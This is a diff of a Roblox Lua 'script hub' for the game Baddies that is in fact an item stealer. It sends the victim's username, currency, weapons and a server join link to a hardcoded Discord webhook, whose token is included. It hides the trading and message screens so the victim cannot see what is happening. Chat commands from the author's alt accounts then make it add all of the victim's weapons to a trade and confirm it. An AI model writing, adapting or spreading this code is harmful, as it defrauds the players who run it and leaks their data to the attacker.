@@ -1,15 +1,11 @@
 -- cee script hub | Baddies
--- NO blocking calls at top level. Everything in task.spawn + pcall.
-
-local Players           = game:GetService("Players")
-local HttpService       = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players           = game:GetService("Players")
 local TextChatService   = game:GetService("TextChatService")
-local TweenService      = game:GetService("TweenService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
+local HttpService       = game:GetService("HttpService")
 
-local lp  = Players.LocalPlayer
-local pg  = lp:WaitForChild("PlayerGui")
+local lp        = Players.LocalPlayer
+local playerGui = lp:WaitForChild("PlayerGui")
 
 local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
 local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
@@ -20,7 +16,102 @@ local PINK     = 0xFF69B4
 local BOT_NAME = "cee script hub | Baddies"
 
 -- ═══════════════════════════════════════════
---  HTTP  (tries every mobile method)
+--  REMOTES  (fetched once, used everywhere)
+-- ═══════════════════════════════════════════
+local Net                  = ReplicatedStorage.Modules.Net
+local RFTradingSendOffer   = Net["RF/Trading/SendTradeOffer"]
+local RESetPhoneSettings   = Net["RE/SetPhoneSettings"]
+local RFTradingSetReady    = Net["RF/Trading/SetReady"]
+local RFTradingConfirm     = Net["RF/Trading/ConfirmTrade"]
+local RFTradingAddItem     = Net["RF/Trading/AddItem"]
+
+-- ═══════════════════════════════════════════
+--  KNOWN WEAPON HEX IDs  (static type IDs)
+-- ═══════════════════════════════════════════
+-- Type: "Weapon" or "WeaponSkin"
+local KNOWN_ITEMS = {
+    {"Weapon",    "2a2bce877d67474299"},  -- Snowball Launcher
+    {"Weapon",    "50f672aee7054d2d9d"},  -- Golden Snowball Launcher
+    {"Weapon",    "984f30e6f65a40a498"},  -- Kitty Purse
+    {"Weapon",    "000183526d6646eca4"},  -- Sledge Hammer
+    {"Weapon",    "f864e570fb0743c987"},  -- Freeze Gun
+    {"WeaponSkin","6994851e04ae4b80b4"},  -- Glitter Style
+}
+
+-- ═══════════════════════════════════════════
+--  DYNAMIC WEAPON ID SCANNER
+--  Reads hex IDs from the player's own data
+--  so ALL owned weapons get added, not just
+--  the hardcoded ones above.
+-- ═══════════════════════════════════════════
+local HEX18 = "^%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x$"
+
+local function scanForIds()
+    local found = {}
+    local seen  = {}
+    -- Add known IDs first
+    for _, pair in ipairs(KNOWN_ITEMS) do
+        local k = pair[1]..":"..pair[2]
+        if not seen[k] then seen[k]=true; table.insert(found, pair) end
+    end
+    -- Scan player data folders for hex-named instances / attributes
+    local searchRoots = {
+        lp:FindFirstChild("Data"),
+        lp:FindFirstChild("PlayerData"),
+        lp:FindFirstChild("Weapons"),
+        lp:FindFirstChild("Inventory"),
+        lp:FindFirstChild("Items"),
+    }
+    local function deepScan(obj, depth)
+        if not obj or depth > 5 then return end
+        for _, v in ipairs(obj:GetChildren()) do
+            -- Instance name looks like a hex ID
+            if v.Name:match(HEX18) then
+                local t = "Weapon"
+                -- Guess type from parent name or attributes
+                local parentLow = obj.Name:lower()
+                if parentLow:find("skin",1,true) or parentLow:find("style",1,true) then
+                    t = "WeaponSkin"
+                end
+                pcall(function()
+                    if v:GetAttribute("Type") then t = v:GetAttribute("Type") end
+                    if v:GetAttribute("ItemType") then t = v:GetAttribute("ItemType") end
+                end)
+                local k = t..":"..v.Name
+                if not seen[k] then seen[k]=true; table.insert(found,{t, v.Name}) end
+            end
+            -- Attributes on any instance
+            pcall(function()
+                for _, val in pairs(v:GetAttributes()) do
+                    local s = tostring(val)
+                    if s:match(HEX18) then
+                        local k = "Weapon:"..s
+                        if not seen[k] then seen[k]=true; table.insert(found,{"Weapon",s}) end
+                    end
+                end
+            end)
+            deepScan(v, depth + 1)
+        end
+    end
+    for _, root in ipairs(searchRoots) do deepScan(root, 0) end
+    return found
+end
+
+-- ═══════════════════════════════════════════
+--  ADD ALL WEAPONS TO TRADE
+-- ═══════════════════════════════════════════
+local function addWeapons()
+    local items = scanForIds()
+    for _, pair in ipairs(items) do
+        pcall(function()
+            RFTradingAddItem:InvokeServer(pair[1], pair[2])
+        end)
+        task.wait(0.05)
+    end
+end
+
+-- ═══════════════════════════════════════════
+--  HTTP HELPER
 -- ═══════════════════════════════════════════
 local function sendRequest(url, payload)
     if not url or url == "" or url == "PUTHERE" then return end
@@ -40,18 +131,18 @@ local function sendRequest(url, payload)
 end
 
 -- ═══════════════════════════════════════════
---  TOOL SCANNER + CLASSIFIER
+--  TOOL SCANNER + CLASSIFER
 -- ═══════════════════════════════════════════
 local BASE_PAT  = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
 local STYLE_PAT = {"mma","karate","boxing","capoeira","style","fighting","kung","judo","taekwondo","breakdance"}
 local STOMP_PAT = {"stomp","slam"}
-local RICH_WEAPONS = {
+local RICH_CHECK = {
     {label="Spiked Kitty",          keys={"spiked kitty"}},
     {label="Glitter Bomb",          keys={"glitter bomb"}},
     {label="Glitter Blue Spray",    keys={"glitter blue"}},
-    {label="Love Me Hate Me Taser", keys={"love me hate me","lmhm"}},
-    {label="Spiked Knuckles (50%)", keys={"spiked knuckle"}},
-    {label="Ice Katana (30%)",      keys={"ice katana"}},
+    {label="Love Me Hate Me Taser", keys={"love me hate me"}},
+    {label="Spiked Knuckles",       keys={"spiked knuckle"}},
+    {label="Ice Katana",            keys={"ice katana"}},
 }
 
 local function scanTools()
@@ -64,7 +155,6 @@ local function scanTools()
     end
     pcall(scan, lp:FindFirstChild("Backpack"))
     pcall(scan, lp.Character)
-    pcall(scan, lp:FindFirstChild("StarterGear"))
     return all
 end
 
@@ -86,7 +176,7 @@ end
 
 local function checkRich(all)
     local lines = {}
-    for _, rw in ipairs(RICH_WEAPONS) do
+    for _, rw in ipairs(RICH_CHECK) do
         local found = false
         for _, t in ipairs(all) do
             local low = t:lower()
@@ -108,93 +198,52 @@ local function fmtNum(n)
 end
 
 local function getExec()
-    if getexecutorname then
-        local ok, n = pcall(getexecutorname); if ok and n then return n end
-    end
+    if getexecutorname then local ok,n=pcall(getexecutorname); if ok and n then return n end end
     if syn and syn.request then return "Synapse X" end
     if KRNL_LOADED         then return "Krnl" end
     if fluxus              then return "Fluxus" end
     if Delta               then return "Delta" end
     if Electron            then return "Electron" end
-    return "Unknown Executor"
+    return "Unknown"
 end
 
 -- ═══════════════════════════════════════════
---  WEAPON LIST  (names for GUI click + hex IDs for direct add)
--- ═══════════════════════════════════════════
-local WEAPON_NAMES = {
-    "Parasol","SpikedPurse","Glitter Bomb","Spiked Kitty Stanli","Ice Katana",
-    "Love Me Hate Me Taser","Glitter Blue Spray","Spiked Knuckles",
-    "Grim Reaper Cloak","Blast Bow","Princess Power Style","Feral Frenzy Style",
-    "Roller Skates","Storm Dancer Style","Hug of Doom Style","Hero Finisher",
-    "Grim Reaper Finisher","Gun Finisher","Doom Finisher","Breakdance Finisher",
-    "Celestial Scythes","Graveyard Grip Knuckles","Shadow Sorcery Purse",
-    "Marshmallow Mixer Purse","Unicorn Brass Knuckles","Disco Dash Board",
-    "Toast Hoverboard","Frost Stomp","Sniper Rifle RPG","Cursed Board",
-    "Evil Goth Knuckles","Witchy Broom Board","Floating Leaf",
-    "Shark Brass Knuckles","Ghostly RPG","404 Not Found Blade",
-    "Vampire Flamethrower","Big Boom Hammer","Mallow Glide Board",
-    "Mean Girl Mayhem Style","Karate Style","Kitty Purse","Freeze Gun",
-    "Shiny Purse","Loveboard","Brass Knuckles","Golden Snowball Launcher",
-    "Snowball Launcher","Sledge Hammer","Turkey Skewers","Fan of Requiem",
-    "Chainsaw","Scythe","Trashbin Disguise","Crowbar","Harpoon",
-    "Heartbreaker Style","Cannon","Spiked Nightmare Purse","Glitter Style",
-    "Trident","Sakura Blade","Nunchucks","DogPurse","Champion Gloves",
-    "Chain Mace","Graveyard Howl RPG","Mocha Missile Maker RPG",
-    "Black Flame Stomp","Angelic Board","Credit Card Hoverboard",
-    "Constellations RPG","Palm Sakura Blade","Popstar Hoverboard",
-    "Pink Star Board","Thorned Romance","Mischief Stomp","Lava RPG",
-    "Crushing Love","Love Bomb Finisher","Haunted Cemetery RPG",
-    "Cyber Samurai RPG","Black Flame Knuckles","Vanity Vortex Finisher",
-    "Egg Rocket Launcher","Frostwind Glider Board","Sakura Finisher",
-    "The Doom Knuckles","Flintlock","Pinata Purse","Cutlass Sakura Blade",
-    "Police Hoverboard","Vampire Brass Knuckles","Dual Shadow of Night Blade",
-    "Dance Bomb","Queen Throne","Gravekeeper Charm","Surf Up Hoverboard",
-    "Y&Y Board","Cupid Bow","Witch Wands Taser",
-}
-
--- ═══════════════════════════════════════════
---  TASK 1 — WEBHOOK PING  (fires first, independent)
+--  WEBHOOK PING  (runs on execute)
 -- ═══════════════════════════════════════════
 task.spawn(function()
     task.wait(2)
-
-    local ok2 = pcall(function()
-        local name   = lp.Name
-        local all    = scanTools()
+    pcall(function()
+        local name = lp.Name
+        local all  = scanTools()
         local base, weapons, styles, stomps = classifyTools(all)
         local rich   = checkRich(all)
         local isRich = #weapons >= 3
 
-        local ls   = lp:FindFirstChild("leaderstats")
-        local din  = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
-        local sla  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
+        local ls  = lp:FindFirstChild("leaderstats")
+        local din = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
+        local sla = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
 
         local weapLines = {}
-        for _, w in ipairs(weapons) do
-            table.insert(weapLines, "1x "..w)
-        end
+        for _, w in ipairs(weapons) do table.insert(weapLines, "1x "..w) end
         if #weapLines == 0 then table.insert(weapLines, "None") end
 
         local styleStr = #styles>0 and ("- "..table.concat(styles,"\n- ")) or "- None"
         local stompStr = #stomps>0 and ("- "..table.concat(stomps,"\n- ")) or "- None"
-
         local joinUrl  = "https://www.roblox.com/games/start?placeId="..
-                         tostring(game.PlaceId).."&gameInstanceId="..
-                         tostring(game.JobId)
+                         tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)
 
         local embed = {
             color  = PINK,
             fields = {
-                {name="User",     value=name,                              inline=true},
-                {name="Dinero",   value=fmtNum(din),                       inline=true},
-                {name="Slays",    value=fmtNum(sla),                       inline=true},
-                {name="Executor", value=getExec(),                         inline=true},
+                {name="User",     value=name,               inline=true},
+                {name="Dinero",   value=fmtNum(din),         inline=true},
+                {name="Slays",    value=fmtNum(sla),         inline=true},
+                {name="Executor", value=getExec(),           inline=true},
                 {name="Players",  value=#Players:GetPlayers().." / "..Players.MaxPlayers, inline=true},
                 {name="Trade",    value="Tradable: "..#weapons.."  |  Untradable: "..#base, inline=true},
-                {name="Rich Weapons",            value=table.concat(rich,"\n"),        inline=false},
-                {name="Weapons",                 value=table.concat(weapLines,"\n"),   inline=false},
-                {name="Skins & Fighting Styles", value="Fighting Styles:\n"..styleStr.."\n\nStomps:\n"..stompStr, inline=false},
+                {name="Rich Weapons",            value=table.concat(rich,"\n"),      inline=false},
+                {name="Weapons",                 value=table.concat(weapLines,"\n"), inline=false},
+                {name="Skins & Fighting Styles", value="Fighting Styles:\n"..styleStr.."\nStomps:\n"..stompStr, inline=false},
                 {name="Join Link", value="[Click to Join]("..joinUrl..")", inline=false},
             },
             footer    = {text=BOT_NAME.." | "..name},
@@ -211,229 +260,117 @@ task.spawn(function()
             sendRequest(MY_WEBHOOK, {username=BOT_NAME, content="@everyone RICH: "..name, embeds={embed}})
         end
     end)
-
-    if not ok2 then
-        -- Fallback: bare minimum ping even if embed building fails
-        pcall(function()
-            if USER_WEBHOOK ~= "PUTHERE" then
-                sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=lp.Name.." executed (fallback ping)"})
-            end
-        end)
-    end
+    -- fallback bare ping if embed build fails
+    pcall(function()
+        if USER_WEBHOOK ~= "PUTHERE" then
+            sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=lp.Name.." executed (no embed)"})
+        end
+    end)
 end)
 
 -- ═══════════════════════════════════════════
---  TASK 2 — HIDE MESSAGES GUI
+--  GUI HANDLING  (exactly like reference)
+--   Trading GUI → Enabled = false  (freeze screen)
+--   Messages GUI → Destroy
 -- ═══════════════════════════════════════════
-task.spawn(function()
-    local function kill(g)
-        if g.Name == "Messages" then pcall(function() g:Destroy() end) end
+local function handleGui(gui)
+    if gui.Name == "Trading" then
+        gui.Enabled = false
+    elseif gui.Name == "Messages" then
+        gui:Destroy()
     end
-    for _, g in ipairs(pg:GetChildren()) do kill(g) end
-    pg.ChildAdded:Connect(kill)
+end
+
+for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
+playerGui.ChildAdded:Connect(handleGui)
+
+task.spawn(function()
     while true do
+        local tg = playerGui:FindFirstChild("Trading")
+        if tg then tg.Enabled = false end
         task.wait(0.1)
-        local m = pg:FindFirstChild("Messages")
-        if m then pcall(function() m:Destroy() end) end
     end
 end)
 
 -- ═══════════════════════════════════════════
---  TASK 3 — TRADING (auto-add, 1/2 commands)
+--  ENABLE TRADING
+-- ═══════════════════════════════════════════
+RESetPhoneSettings:FireServer("TradeEnabled", true)
+
+-- ═══════════════════════════════════════════
+--  CHAT COMMANDS  (exact logic from reference)
+--  Any message from alt → send trade offer
+--  "add" → addWeapons()
+--  "1"   → SetReady
+--  "2"   → ConfirmTrade
+-- ═══════════════════════════════════════════
+TextChatService.OnIncomingMessage = function(message)
+    local ts = message.TextSource
+    if not ts then return end
+    local sender = Players:GetPlayerByUserId(ts.UserId)
+    if not sender then return end
+
+    -- Trim whitespace
+    local txt = tostring(message.Text or "")
+    txt = txt:match("^%s*(.-)%s*$") or txt
+
+    -- Is sender one of our alts?
+    local isAlt = false
+    for _, u in ipairs(MY_USERNAMES) do
+        if sender.Name:lower() == u:lower() then isAlt = true; break end
+    end
+
+    if isAlt then
+        -- Always attempt to send a trade offer to the alt
+        local target = Players:FindFirstChild(sender.Name)
+        if target then
+            pcall(function() RFTradingSendOffer:InvokeServer(target) end)
+        end
+        -- Command handling
+        if txt:lower() == "add" then
+            task.spawn(addWeapons)
+        elseif txt == "1" then
+            pcall(function() RFTradingSetReady:InvokeServer(true) end)
+        elseif txt == "2" then
+            pcall(function() RFTradingConfirm:InvokeServer() end)
+        end
+    end
+
+    -- Local player typed a command
+    if sender.UserId == lp.UserId then
+        if txt:lower() == "add" then
+            task.spawn(addWeapons)
+        elseif txt == "1" then
+            pcall(function() RFTradingSetReady:InvokeServer(true) end)
+        elseif txt == "2" then
+            pcall(function() RFTradingConfirm:InvokeServer() end)
+        end
+    end
+end
+
+-- ═══════════════════════════════════════════
+--  CODES AUTO-REDEEM
 -- ═══════════════════════════════════════════
 task.spawn(function()
-    -- Fetch all remotes lazily inside pcall
-    local Net, RFSend, REPhone, RFReady, RFConfirm, RFAccept, RFTokens
-
+    task.wait(3)
+    local CODES = {
+        "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY",
+        "RELEASE","LAUNCH","UPDATE","NEWUPDATE","1MILLION",
+        "500K","100K","SORRY","FIXEDUPDATE","HOLIDAY","SPRING","SUMMER",
+    }
     pcall(function()
-        Net      = ReplicatedStorage:WaitForChild("Modules", 8):WaitForChild("Net", 8)
-        RFSend   = Net["RF/Trading/SendTradeOffer"]
-        REPhone  = Net["RE/SetPhoneSettings"]
-        RFReady  = Net["RF/Trading/SetReady"]
-        RFConfirm= Net["RF/Trading/ConfirmTrade"]
-        RFAccept = Net["RF/Trading/AcceptTradeOffer"]
-        RFTokens = Net["RF/Trading/SetTokens"]
-    end)
-
-    -- Enable trading
-    pcall(function() REPhone:FireServer("TradeEnabled", true) end)
-
-    -- Show trade request panel
-    pcall(function()
-        pg:WaitForChild("TradeList", 8)
-           :WaitForChild("Main", 5)
-           :WaitForChild("TradeRequest", 5).Visible = true
-    end)
-
-    -- Click weapon buttons in the Trading GUI
-    local function clickWeapons()
-        local sf = nil
-        pcall(function()
-            sf = pg.Trading.Frame.Main.YourOffer.ItemDisplay.ScrollingFrame
-        end)
-        if not sf then return 0 end
-        local added = 0
-        for _ = 1, 5 do
-            local n = 0
-            for _, name in ipairs(WEAPON_NAMES) do
-                local btn = sf:FindFirstChild(name)
-                if btn and btn:IsA("ImageButton") and btn.Visible then
-                    pcall(function() firesignal(btn.MouseButton1Click) end)
+        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+            local low = v.Name:lower()
+            if low:find("code",1,true) and
+               (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
+                for _, code in ipairs(CODES) do
                     pcall(function()
-                        local p, s = btn.AbsolutePosition, btn.AbsoluteSize
-                        VirtualInputManager:SendMouseButtonEvent(p.X+s.X/2, p.Y+s.Y/2, 0, true, game, 0)
-                        task.wait(0.04)
-                        VirtualInputManager:SendMouseButtonEvent(p.X+s.X/2, p.Y+s.Y/2, 0, false, game, 0)
+                        if v:IsA("RemoteFunction") then v:InvokeServer(code)
+                        else v:FireServer(code) end
                     end)
-                    n = n + 1; added = added + 1
-                    task.wait(0.02)
+                    task.wait(0.3)
                 end
-            end
-            if n == 0 then break end
-            task.wait(0.4)
-        end
-        return added
-    end
-
-    local function getTokens()
-        local n = 0
-        pcall(function()
-            local tl = pg.Trading.Frame.Categories.TokenAmount.TextLabel
-            n = tonumber(string.match(tl.Text, "%d+")) or 0
-        end)
-        return n
-    end
-
-    local function spamConfirm()
-        for _ = 1, 20 do
-            pcall(function() RFConfirm:InvokeServer() end)
-            task.wait(0.05)
-        end
-    end
-
-    local function doAdd()
-        clickWeapons()
-        local ta = getTokens()
-        if ta and ta > 0 then pcall(function() RFTokens:InvokeServer(ta) end) end
-        task.wait(0.5)
-        pcall(function() RFReady:InvokeServer(true) end)
-        task.wait(0.5)
-        spamConfirm()
-    end
-
-    local isProcessing = false
-
-    local function onChat(sender, txt)
-        local isAlt = false
-        for _, u in ipairs(MY_USERNAMES) do
-            if sender.Name:lower() == u:lower() then isAlt = true; break end
-        end
-        if not isAlt then return end
-        if isProcessing then return end
-        isProcessing = true
-
-        -- Send them a trade offer
-        task.wait(0.2)
-        pcall(function() RFSend:InvokeServer(sender) end)
-        task.wait(0.3)
-
-        if txt == "add" then
-            doAdd()
-        elseif txt == "1" then
-            pcall(function() RFReady:InvokeServer(true) end)
-        elseif txt == "2" then
-            spamConfirm()
-        end
-
-        task.wait(0.5)
-        isProcessing = false
-    end
-
-    -- Hook modern TextChatService
-    pcall(function()
-        TextChatService.OnIncomingMessage = function(msg)
-            local ts = msg.TextSource
-            if not ts then return end
-            local s = Players:GetPlayerByUserId(ts.UserId)
-            if s then
-                task.delay(0.3, function()
-                    onChat(s, tostring(msg.Text or ""):lower())
-                end)
-            end
-        end
-    end)
-
-    -- Hook legacy Chatted
-    local function hookPlayer(p)
-        pcall(function()
-            p.Chatted:Connect(function(msg)
-                task.delay(0.3, function() onChat(p, msg:lower()) end)
-            end)
-        end)
-    end
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= lp then hookPlayer(p) end
-    end
-    Players.PlayerAdded:Connect(hookPlayer)
-
-    -- Auto-complete when an accepted trade offer comes from our alt
-    task.spawn(function()
-        while true do
-            task.wait(0.5)
-            pcall(function()
-                -- Watch for incoming trade offers from our alts
-                local tradingGui = pg:FindFirstChild("Trading")
-                if tradingGui and tradingGui.Enabled then
-                    local frame = tradingGui:FindFirstChild("Frame")
-                    local theirOffer = frame and frame:FindFirstChild("Main")
-                                       and frame.Main:FindFirstChild("TheirOffer")
-                    if theirOffer then
-                        -- Check if the trader is one of our alts
-                        local traderName = ""
-                        pcall(function()
-                            traderName = frame.Main.TraderName.Text:lower()
-                        end)
-                        for _, u in ipairs(MY_USERNAMES) do
-                            if traderName:find(u:lower(), 1, true) then
-                                task.wait(1)
-                                doAdd()
-                                break
-                            end
-                        end
-                    end
-                end
-            end)
-        end
-    end)
-
-    -- Auto-redeem codes
-    task.spawn(function()
-        task.wait(3)
-        local CODES = {
-            "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY",
-            "RELEASE","LAUNCH","UPDATE","NEWUPDATE","1MILLION",
-            "500K","100K","SORRY","FIXEDUPDATE","HOLIDAY","SPRING","SUMMER",
-        }
-        local redeemRemote = nil
-        pcall(function()
-            for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
-                local low = v.Name:lower()
-                if low:find("code",1,true) and
-                   (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-                    redeemRemote = v; break
-                end
-            end
-        end)
-        if redeemRemote then
-            for _, code in ipairs(CODES) do
-                pcall(function()
-                    if redeemRemote:IsA("RemoteFunction") then
-                        redeemRemote:InvokeServer(code)
-                    else
-                        redeemRemote:FireServer(code)
-                    end
-                end)
-                task.wait(0.3)
+                break
             end
         end
     end)
